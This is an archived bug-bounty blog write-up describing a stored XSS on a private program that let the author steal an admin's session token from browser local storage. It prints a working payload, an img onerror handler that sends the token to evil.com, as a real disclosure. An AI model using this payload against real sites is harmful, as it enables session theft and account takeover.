---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-25_stealing-local-storage-data-through-xss.md
original_filename: 2019-04-25_stealing-local-storage-data-through-xss.md
title: Stealing local storage data through XSS
category: documents
detected_topics:
- xss
- command-injection
- otp
- api-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- api-security
language: en
raw_sha256: 76ccf7f9f88f357fc0a3cbf14594e8a60adcc8e1cfcbd5d5f9ba4677b7f4dabb
text_sha256: d5668e9c445aebf8ebdcaf01adcd98f756ad603785d7e2dffc903121ba6f0470
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Stealing local storage data through XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-25_stealing-local-storage-data-through-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `76ccf7f9f88f357fc0a3cbf14594e8a60adcc8e1cfcbd5d5f9ba4677b7f4dabb`
- Text SHA256: `d5668e9c445aebf8ebdcaf01adcd98f756ad603785d7e2dffc903121ba6f0470`


## Content

---
title: "Stealing local storage data through XSS"
url: "http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html"
final_url: "http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html"
authors: ["Harshad Gaikwad (@h4rsh4d)"]
bugs: ["Stored XSS", "Account takeover"]
bounty: "800"
publication_date: "2019-04-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5288
---

###  Stealing local storage data through XSS 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

[ April 25, 2019  ](http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html "permanent link")

##  **Stealing local storage data through XSS**

  

  

In this blog, I'm going to show how to steal local storage data and one of my same finding on bugcrowd.😀

  

See screen shot below which is storing sensitive data in Local Storage.

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9CKX4wUgUdc7St7HceLJn4P4xshiw8AcB5B9zrEPPDwFx4YJR-C4CC6sp6CVZKC4mOY0fLs690GWjUvhFWhUJ8MrpqN-1nt8rainV2metW-nll6ASK1Zh-IZidk_5STbQKedMlHh6tNQ/s1600/Local+Stored+data.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9CKX4wUgUdc7St7HceLJn4P4xshiw8AcB5B9zrEPPDwFx4YJR-C4CC6sp6CVZKC4mOY0fLs690GWjUvhFWhUJ8MrpqN-1nt8rainV2metW-nll6ASK1Zh-IZidk_5STbQKedMlHh6tNQ/s1600/Local+Stored+data.PNG)  
---  
Local Storage.  
  
  

  

Its easy to steal this Local stored data through javascript localStorage.getItem() function.  
lets alert this data through console for demonstration.  
  
Payload : alert(localStorage.getItem('access_token'))

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeW6T9sVTl9N5V-kBEt0ahL3L9v7_zAgKpgEa6WFmJEjs7ZYMc7gxwUaqat-P-I6sReVYR1zdUwGzmtSWgKty2mJbo_bxyPf626ckylh8jRuK1GJ8rRQ3L_aqUGojMoCgaxtNvaxaE2oo/s1600/1.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeW6T9sVTl9N5V-kBEt0ahL3L9v7_zAgKpgEa6WFmJEjs7ZYMc7gxwUaqat-P-I6sReVYR1zdUwGzmtSWgKty2mJbo_bxyPf626ckylh8jRuK1GJ8rRQ3L_aqUGojMoCgaxtNvaxaE2oo/s1600/1.PNG)  
---  
Simple Example through Console  
  

  

I have found same challenge previously on bugcrowd private program. 

Authorisation token was responsible to handle web application session but they are storing that authorisation token in local storage. which is not a good way to protect session tokens. 

  

So i manged to find Stored XSS on that program and that XSS is getting executed on Admin Account. Bingo !! 😜

it take me 2 min to craft payload and steal that authorisation token. ezpz 😎

I submitted that vulnerability as Stored XSS to Admin Account Takeover. 😅

  
  

Final Payload : 

<img src=x onerror="document.location='https://evil.com?key='+window.localStorage.getItem('simple_auth:session')">

  

JavaScript will pickup local storage data and concat it to end of the string at the time of onerror event handler execution. after that it will redirect to evil.com with data. i.e local stored data. 

  
  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxW4diNaSO89SOgNv6qnfemEQPIML6CpBPgZFa0x63YSWv9D03DUSqnge5Wf0fsNtmvmV7jXavk9bBhrmsDkswsefP1TdLQwNJEb_G1t7wAn0-xRclC0ywrm2ctZ5NHKPUIMMsAGltD2w/s1600/2.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxW4diNaSO89SOgNv6qnfemEQPIML6CpBPgZFa0x63YSWv9D03DUSqnge5Wf0fsNtmvmV7jXavk9bBhrmsDkswsefP1TdLQwNJEb_G1t7wAn0-xRclC0ywrm2ctZ5NHKPUIMMsAGltD2w/s1600/2.PNG)  
---  
Redirection towards attackers server.  
  

  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvlbq84hkY4xjYOkeLsBiLvVmT8rvwNw-AtL-D8yt7KYlFndY7AxNlcib6G7ZgN0KhMT9K2dbSymvOA_euXapJqC_zejcgAMa1mPKvfCWbTLY9ebT0euBaPb9qN328CONRwjLh3eOE07o/s1600/Token+Steal.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvlbq84hkY4xjYOkeLsBiLvVmT8rvwNw-AtL-D8yt7KYlFndY7AxNlcib6G7ZgN0KhMT9K2dbSymvOA_euXapJqC_zejcgAMa1mPKvfCWbTLY9ebT0euBaPb9qN328CONRwjLh3eOE07o/s1600/Token+Steal.PNG)  
---  
Attacker server received Local Stored data  
  

  

Note : 

it's recommended not to store sensitive information in local storage. 😂

  

  

Bounty awarded : $800 (Happy with it) 😄  
  
Thanks for Readings .. 💜💜💚  
  
  

  

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

  1. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Smaran](https://www.blogger.com/profile/11155958320021948036)[27 April 2019 at 05:30](http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html?showComment=1556368257673#c3731755132408989534)

Nice one brother.

Reply[Delete](https://www.blogger.com/comment/delete/2656914608170622406/3731755132408989534)

Replies

Reply

Add comment

Load more...

#### Post a Comment

[](https://www.blogger.com/comment/frame/2656914608170622406?po=1408943742642945583&hl=en-GB&saa=85391&origin=http://blog.h4rsh4d.com&skin=contempo)
